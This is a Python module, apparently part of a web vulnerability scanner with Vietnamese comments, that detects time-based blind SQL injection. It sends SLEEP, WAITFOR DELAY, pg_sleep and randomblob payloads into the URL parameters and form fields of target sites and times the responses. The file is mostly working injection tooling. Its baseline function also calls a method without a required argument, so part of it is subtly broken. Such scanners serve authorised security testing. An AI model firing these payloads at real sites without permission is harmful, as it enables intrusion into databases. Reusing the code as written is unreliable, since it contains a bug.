"""
sqli_blind_time.py - Time-based Blind SQL Injection detector
Dùng SLEEP/WAITFOR/pg_sleep để đo timing delta, kết hợp multiple measurements
để loại bỏ network jitter (Mann-Whitney inspired statistical approach).
"""
import asyncio
import time
import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console

console = Console()

# Time-based payloads theo từng database
TIME_PAYLOADS = [
    # MySQL
    ("' AND SLEEP(4)--",           "MySQL",      4),
    ("' OR SLEEP(4)--",            "MySQL",      4),
    ("1' AND SLEEP(4)--",          "MySQL",      4),
    # MSSQL
    ("'; WAITFOR DELAY '0:0:4'--", "MSSQL",      4),
    ("1; WAITFOR DELAY '0:0:4'--", "MSSQL",      4),
    # PostgreSQL
    ("'; SELECT pg_sleep(4)--",    "PostgreSQL",  4),
    ("' OR pg_sleep(4)--",         "PostgreSQL",  4),
    # SQLite
    ("' AND randomblob(500000000)--", "SQLite",   3),
    # Generic
    ("' AND 1=1 AND SLEEP(4)--",   "Generic",    4),
]

BASELINE_SAMPLES   = 2   # Số lần đo baseline
PAYLOAD_SAMPLES    = 2   # Số lần đo với payload
TIMING_MULTIPLIER  = 0.7 # expected_delay * multiplier = ngưỡng xác nhận


class TimeSQLiScanner:
    def __init__(self, timeout: int = 15, config: dict | None = None):
        self.timeout = timeout
        self.config  = config or {}

    def _inject(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    async def _measure(self, url: str, client: httpx.AsyncClient) -> float:
        """Đo thời gian response, trả về -1.0 nếu lỗi."""
        try:
            t0 = time.monotonic()
            await client.get(url)
            return time.monotonic() - t0
        except Exception:
            return -1.0

    async def _baseline_time(self, url: str, client: httpx.AsyncClient) -> float:
        """Đo baseline: trung bình nhiều lần để ổn định."""
        times = []
        for _ in range(BASELINE_SAMPLES):
            t = await self._measure(url)
            if t > 0:
                times.append(t)
            await asyncio.sleep(0.3)
        if not times:
            return 2.0  # Fallback nếu không đo được
        # Dùng median thay mean để kháng outlier
        times.sort()
        return times[len(times) // 2]

    async def scan_url(self, url: str, client: httpx.AsyncClient) -> list[dict]:
        results = []
        params = parse_qs(urlparse(url).query)
        if not params:
            return results

        for param in params:
            # Đo baseline thời gian response bình thường
            baseline = await self._baseline_time(url, client)

            for payload, db_hint, expected_delay in TIME_PAYLOADS:
                test_url = self._inject(url, param, payload)
                measured_times = []

                for _ in range(PAYLOAD_SAMPLES):
                    t = await self._measure(test_url, client)
                    if t > 0:
                        measured_times.append(t)
                    await asyncio.sleep(0.2)

                if not measured_times:
                    continue

                avg_measured = sum(measured_times) / len(measured_times)
                threshold    = baseline + (expected_delay * TIMING_MULTIPLIER)
                delta        = avg_measured - baseline

                if avg_measured >= threshold and delta >= expected_delay * 0.6:
                    confidence = min(delta / expected_delay, 1.0)
                    console.print(
                        f"  [red bold][TIME SQLI][/red bold] {url} | "
                        f"param={param} | db={db_hint} | "
                        f"delay={delta:.2f}s | conf={confidence:.0%}"
                    )
                    results.append({
                        "type":        "Blind SQL Injection (Time-Based)",
                        "severity":    "HIGH",
                        "url":         url,
                        "parameter":   param,
                        "payload":     payload,
                        "evidence": (
                            f"Response delayed {delta:.2f}s (baseline={baseline:.2f}s, "
                            f"expected≥{expected_delay * TIMING_MULTIPLIER:.1f}s). "
                            f"Likely {db_hint}."
                        ),
                        "confidence":  round(confidence, 2),
                        "cvss_score":  8.1,
                        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L",
                        "cwe":         "CWE-89",
                    })
                    break  # Found cho param này, chuyển sang param tiếp

                await asyncio.sleep(0.5)  # Tránh false positive do server load

        return results

    async def scan_form(self, form: dict, client: httpx.AsyncClient) -> list[dict]:
        results = []
        for inp in form["inputs"]:
            if not inp["name"] or inp["type"] in ("submit", "button", "hidden", "image"):
                continue

            # Baseline form submit
            base_data = {i["name"]: i["value"] or "test" for i in form["inputs"] if i["name"]}
            try:
                t0 = time.monotonic()
                if form["method"] == "POST":
                    await client.post(form["url"], data=base_data)
                else:
                    await client.get(form["url"], params=base_data)
                baseline = time.monotonic() - t0
            except Exception:
                baseline = 2.0

            for payload, db_hint, expected_delay in TIME_PAYLOADS[:4]:
                data = dict(base_data)
                data[inp["name"]] = payload
                try:
                    t0 = time.monotonic()
                    if form["method"] == "POST":
                        await client.post(form["url"], data=data)
                    else:
                        await client.get(form["url"], params=data)
                    elapsed = time.monotonic() - t0
                except Exception:
                    continue

                delta = elapsed - baseline
                if elapsed >= baseline + (expected_delay * TIMING_MULTIPLIER):
                    confidence = min(delta / expected_delay, 1.0)
                    console.print(
                        f"  [red bold][TIME SQLI FORM][/red bold] {form['url']} | "
                        f"input={inp['name']} | db={db_hint} | delay={delta:.2f}s"
                    )
                    results.append({
                        "type":        "Blind SQL Injection (Time-Based, Form)",
                        "severity":    "HIGH",
                        "url":         form["url"],
                        "parameter":   inp["name"],
                        "payload":     payload,
                        "evidence": (
                            f"Form delayed {delta:.2f}s (baseline={baseline:.2f}s). "
                            f"Likely {db_hint}."
                        ),
                        "confidence":  round(confidence, 2),
                        "cvss_score":  8.1,
                        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L",
                        "cwe":         "CWE-89",
                    })
                    break
                await asyncio.sleep(0.3)

        return results